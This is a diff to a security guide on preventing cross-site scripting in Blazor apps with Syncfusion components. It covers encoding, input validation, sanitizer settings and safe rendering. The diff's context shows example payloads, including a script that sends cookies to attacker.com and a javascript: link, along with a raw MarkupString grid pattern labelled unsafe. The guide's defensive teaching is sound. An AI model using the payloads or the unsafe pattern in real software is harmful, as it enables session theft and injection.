@@ -57,6 +57,7 @@ Even information already stored in your database might be unsafe if it was not c
 ### Example Attack Payloads
 
 ```html
+
 <!-- Script injection -->
 <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
 
@@ -71,6 +72,7 @@ Even information already stored in your database might be unsafe if it was not c
 
 <!-- JavaScript protocol -->
 <a href="javascript:void(document.cookie='stolen')">Click here</a>
+
 ```
 
 ## How to Prevent XSS Attacks
@@ -83,12 +85,13 @@ Blazor automatically turns special characters in user input into safe, readable 
 
 Use `@userInput` whenever you want to safely display text on the page. Only use `MarkupString` when the HTML has already been sanitized on the server.
 
-```razor
+```
 @* Safe - Blazor automatically encodes *@
 <p>@userInput</p>
 
 @* UNSAFE - Bypasses encoding; only safe if sanitized *@
 <p>@((MarkupString)userInput)</p>
+
 ```
 
 ### 2. Input Validation
@@ -105,6 +108,7 @@ Follow these practices when validating input.
 
 
 ```csharp
+
 using System;
 using System.ComponentModel.DataAnnotations;
 
@@ -133,6 +137,7 @@ public sealed class SafeContentAttribute : ValidationAttribute
         return ValidationResult.Success!;
     }
 }
+
 ```
 
 ### 3. HTML Sanitization
@@ -177,7 +182,8 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
 
 #### BlockEditor with EnableHtmlSanitizer
 
-```razor
+```
+
 @using Syncfusion.Blazor.BlockEditor;
 
 <div id="container">
@@ -200,11 +206,13 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
         }
     };
 }
+
 ```
 
 #### RichTextEditor with Client‑Side and Server‑Side Sanitization
 
-```razor
+```
+
 @using Syncfusion.Blazor.RichTextEditor
 @using System.Net.Http.Json
 @inject HttpClient Http
@@ -245,6 +253,7 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
 
     private Task StoreInDatabase(string cleanHtml) => Task.CompletedTask;
 }
+
 ```
 
 ### Safe HTML Rendering in Data Components
@@ -261,7 +270,8 @@ The example below shows a scenario that should never be used. It renders raw HTM
 
 If the content includes malicious scripts, it can lead to `XSS (Cross‑Site Scripting)` attacks.
 
-```razor
+```
+
 @* NEVER DO THIS *@
 <SfGrid DataSource="@Comments">
     <GridColumns>
@@ -275,6 +285,7 @@ If the content includes malicious scripts, it can lead to `XSS (Cross‑Site Scr
         </GridColumn>
     </GridColumns>
 </SfGrid>
+
 ```
 
 #### SAFE - Sanitized MarkupString (Server-Side Sanitization via API)
@@ -283,7 +294,8 @@ In this example, the HTML content is cleaned and sanitized on the server before 
 
 The `SanitizedContent` property contains only safe HTML, so rendering it with `MarkupString` is secure.
 
-```razor
+```
+
 @using System.Net.Http.Json
 @inject HttpClient Http
 
@@ -317,13 +329,15 @@ public class Comment
     public string SanitizedContent { get; set; } = string.Empty;
     public DateTime CreatedAt { get; set; }
 }
+
 ```
 
 #### Alternative - Text-Only Rendering
 
 If HTML formatting is not required, render the content as plain text. Blazor automatically encodes all special characters, ensuring no injected scripts can execute regardless of what the data source contains.
 
-```razor
+```
+
 <SfGrid DataSource="@Comments">
     <GridColumns>
         <GridColumn Field="@nameof(Comment.Content)" HeaderText="Comment">
@@ -333,6 +347,7 @@ If HTML formatting is not required, render the content as plain text. Blazor aut
         </GridColumn>
     </GridColumns>
 </SfGrid>
+
 ```
 
 #### ListView with Custom Templates
@@ -341,7 +356,8 @@ The same safe rendering rules apply to ListView when displaying user-generated c
 
 The following example conditionally renders content based on whether the message contains HTML. When `IsHtml` is `true`, only pre-sanitized content stored in `SanitizedContent` is rendered as markup. Otherwise, plain text is displayed using Blazor's automatic encoding. This keeps all messages safe regardless of their format.
 
-```razor
+```
+
 @using Syncfusion.Blazor.Lists
 
 <SfListView DataSource="@Messages"
@@ -383,6 +399,7 @@ The following example conditionally renders content based on whether the message
         public DateTime Timestamp { get; set; }
     }
 }
+
 ```
 
 ## Server-Side Sanitization (Authoritative)
@@ -402,6 +419,7 @@ The `System.Text.Encodings.Web` namespace is part of the .NET SDK, so no additio
 ### Server-Side Sanitization Example
 
 ```csharp
+
 using System.Text.Encodings.Web;
 using System.Text.RegularExpressions;
 
@@ -469,11 +487,13 @@ public class ContentService
         return post;
     }
 }
+
 ```
 
 ### API Controller Example
 
 ```csharp
+
 using System.Text.Encodings.Web;
 using System.Text.RegularExpressions;
 
@@ -521,4 +541,5 @@ public class CommentsController : ControllerBase
         return result;
     }
 }
+
 ``` 
